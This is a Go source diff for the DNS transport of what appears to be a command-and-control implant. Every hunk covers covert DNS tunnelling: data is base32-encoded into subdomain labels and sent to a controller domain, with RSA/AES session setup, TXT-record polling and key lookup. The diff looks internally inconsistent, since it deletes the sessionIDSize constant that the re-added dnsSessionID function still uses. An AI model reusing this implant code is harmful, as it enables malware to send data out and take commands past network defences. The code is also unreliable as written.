@@ -31,17 +31,14 @@ const (
 	dnsSendDomainSeg  = 63
 	dnsSendDomainStep = 189 // 63 * 3
 
-	sessionIDSize = 8
+	domainKeyMsg  = "_domainkey"
+	blockReqMsg   = "b"
+	clearBlockMsg = "cb"
 
-	domainKeyMsg      = "_domainkey"
-	blockReqMsg       = "_b"
-	clearBlockMsg     = "_cb"
-	dataMsg           = "d"
 	sessionInitMsg    = "si"
-	sessionPollingMsg = "_sp"
+	sessionPollingMsg = "sp"
 
-	domainKeySubdomain = "_domainkey"
-	nonceStdSize       = 6
+	nonceStdSize = 6
 
 	// Base 32 encoding, so (n*8 + 4) / 5 = 63 means we can encode 39 bytes - 4 bytes for seq
 	byteBlockSize = 35
@@ -70,7 +67,7 @@ type BlockReassembler struct {
 	Recv chan RecvBlock
 }
 
-func dnsLookup(domain string) error {
+func dnsLookup(domain string) (string, error) {
 	// {{if .Debug}}
 	log.Printf("[dns] lookup -> %s", domain)
 	// {{end}}
@@ -79,13 +76,13 @@ func dnsLookup(domain string) error {
 		// {{if .Debug}}
 		log.Printf("[!] failure -> %s", domain)
 		// {{end}}
-		return err
+		return "", err
 	}
-	return nil
+	return strings.Join(txts, ""), nil
 }
 
 // Send raw bytes of an arbitrary length to the server
-func dnsSend(parentDomain string, msgType string, data []byte) error {
+func dnsSend(parentDomain string, msgType string, data []byte) (string, error) {
 
 	encoded := dnsEncodeToString(data)
 	size := int(math.Ceil(float64(len(encoded)) / float64(dnsSendDomainStep)))
@@ -134,28 +131,27 @@ func dnsSend(parentDomain string, msgType string, data []byte) error {
 		// {{end}}
 
 		subdomain := strings.Join(subdata, ".")
-		pos := dnsEncodeToString(dnsDomainPosition(index, size))
-		domain := subdomain + fmt.Sprintf(".%s.%s.%s.%s", pos, nonce, msgType, parentDomain)
-		err := dnsLookup(domain)
+		seq := dnsEncodeToString(dnsDomainSeq(index))
+		domain := subdomain + fmt.Sprintf(".%s.%s.%s.%s", seq, nonce, msgType, parentDomain)
+		_, err := dnsLookup(domain)
 		if err != nil {
-			return err
+			return "", err
 		}
 
 	}
 	// A domain with no data means it's the end of the message
-	domain := fmt.Sprintf("%s.%s.%s", nonce, msgType, parentDomain)
-	err := dnsLookup(domain)
+	domain := fmt.Sprintf("%s.%s.%s", nonce, "_"+msgType, parentDomain)
+	txt, err := dnsLookup(domain)
 	if err != nil {
-		return err
+		return "", err
 	}
-	return nil
+	return txt, nil
 }
 
 // Binary encoding of the current position of the data encoded into a domain
-func dnsDomainPosition(start int, stop int) []byte {
+func dnsDomainSeq(seq int) []byte {
 	buf := new(bytes.Buffer)
-	binary.Write(buf, binary.LittleEndian, uint32(start))
-	binary.Write(buf, binary.LittleEndian, uint32(stop))
+	binary.Write(buf, binary.LittleEndian, uint32(seq))
 	return buf.Bytes()
 }
 
@@ -163,12 +159,11 @@ func dnsDomainPosition(start int, stop int) []byte {
 
 func dnsStartSession(parentDomain string) (string, AESKey, error) {
 	sessionKey := RandomAESKey()
-	sessionID := dnsSessionID()
-	pubKey := dnsGetServerPublicKey()
 
+	pubKey := dnsGetServerPublicKey()
+	sessionInitID := dnsSessionID()
 	dnsSessionInit := &pb.DNSSessionInit{
-		SessionId: sessionID,
-		Key:       sessionKey[:],
+		Key: sessionKey[:],
 	}
 	data, _ := proto.Marshal(dnsSessionInit)
 	encryptedData, err := RSAEncrypt(data, pubKey)
@@ -180,7 +175,7 @@ func dnsStartSession(parentDomain string) (string, AESKey, error) {
 	if err != nil {
 		return "", AESKey{}, errors.New("Failed to start new DNS session")
 	}
-	return sessionID, sessionKey, nil
+	return sessionInitID, sessionKey, nil
 }
 
 // Get the public key of the server
@@ -217,7 +212,7 @@ func dnsGetServerPublicKey() *rsa.PublicKey {
 func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 	selector = strings.ToLower(selector)
 	nonce := dnsNonce(nonceStdSize)
-	domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, selector, domainKeySubdomain, parentDomain)
+	domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, selector, domainKeyMsg, parentDomain)
 	// {{if .Debug}}
 	log.Printf("[dns] lookup -> %s", domain)
 	// {{end}}
@@ -244,56 +239,6 @@ func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 
 // --------------------------- DNS SESSION SEND ---------------------------
 
-// Send a session message
-func dnsSessionSend(parentDomain string, sessionID string, sessionKey AESKey, envelope *pb.Envelope) error {
-	envelopeData, _ := proto.Marshal(envelope)
-	encryptedEnvelope, _ := GCMEncrypt(sessionKey, envelopeData)
-
-	// Send message header
-	size := uint32(math.Round(float64(len(encryptedEnvelope)) / float64(byteBlockSize)))
-	headerID := dnsBlockHeaderID()
-	dnsBlock := &pb.DNSBlockHeader{Id: headerID, Size: size}
-	dnsBlockData, _ := proto.Marshal(dnsBlock)
-	encryptedDNSBlock := sessionEncrypt(sessionKey, dnsBlockData)
-	nonce := dnsNonce(nonceStdSize)
-
-	domain := fmt.Sprintf("%s.%s.%s._sh.%s", nonce, encryptedDNSBlock, sessionID, parentDomain)
-	// {{if .Debug}}
-	log.Printf("[dns] lookup -> %s", domain)
-	// {{end}}
-	txts, err := net.LookupTXT(domain)
-	if err != nil {
-		return err
-	} else if len(txts) < 1 || txts[0] == "1" {
-		return errors.New("Server rejected session message header")
-	}
-
-	// Send message body
-	nonce = dnsNonce(nonceStdSize)
-	encryptedHeaderID := sessionEncrypt(sessionKey, []byte(headerID))
-	for sequenceNumber := uint32(0); sequenceNumber < size; sequenceNumber++ {
-		buf := new(bytes.Buffer)
-		binary.Write(buf, binary.LittleEndian, sequenceNumber)
-
-		start := sequenceNumber * byteBlockSize
-		stop := start + byteBlockSize
-		data := append(buf.Bytes(), encryptedEnvelope[start:stop]...)
-
-		encoded := base32.StdEncoding.EncodeToString(data)
-		domain := fmt.Sprintf("%s.%s.%s.%s.s.%s", nonce, encoded, encryptedHeaderID, sessionID, parentDomain)
-		// {{if .Debug}}
-		log.Printf("[dns] lookup -> %s", domain)
-		// {{end}}
-		txts, err := net.LookupTXT(domain)
-		if err != nil {
-			return err
-		} else if len(txts) < 1 || txts[0] == "1" {
-			return errors.New("Server rejected session message")
-		}
-	}
-	return nil
-}
-
 // --------------------------- DNS SESSION RECV ---------------------------
 
 func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ctrl chan bool, recv chan *pb.Envelope) {
@@ -301,7 +246,7 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 		select {
 		case <-ctrl:
 			return
-		default:
+		case <-time.After(pollInterval):
 			nonce := dnsNonce(nonceStdSize)
 			domain := fmt.Sprintf("_%s.%s._sp.%s", nonce, sessionID, parentDomain)
 			// {{if .Debug}}
@@ -470,18 +415,6 @@ func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, sto
 
 // --------------------------- HELPERS ---------------------------
 
-// SessionIDs are public parameters in this use case
-// so it's only important that they're unique
-func dnsSessionID() string {
-	insecureRand.Seed(time.Now().UnixNano())
-	sessionID := []rune{}
-	for i := 0; i < sessionIDSize; i++ {
-		index := insecureRand.Intn(len(dnsCharSet))
-		sessionID = append(sessionID, dnsCharSet[index])
-	}
-	return "_" + string(sessionID)
-}
-
 func dnsBlockHeaderID() string {
 	insecureRand.Seed(time.Now().UnixNano())
 	blockID := []rune{}
@@ -531,4 +464,16 @@ func dnsDecodeString(raw string) ([]byte, error) {
 	}
 
 	return lowerBase32.DecodeString(string(nb))
+}
+
+// SessionIDs are public parameters in this use case
+// so it's only important that they're unique
+func dnsSessionID() string {
+	insecureRand.Seed(time.Now().UnixNano())
+	sessionID := []rune{}
+	for i := 0; i < sessionIDSize; i++ {
+		index := insecureRand.Intn(len(dnsCharSet))
+		sessionID = append(sessionID, dnsCharSet[index])
+	}
+	return "_" + string(sessionID)
 }
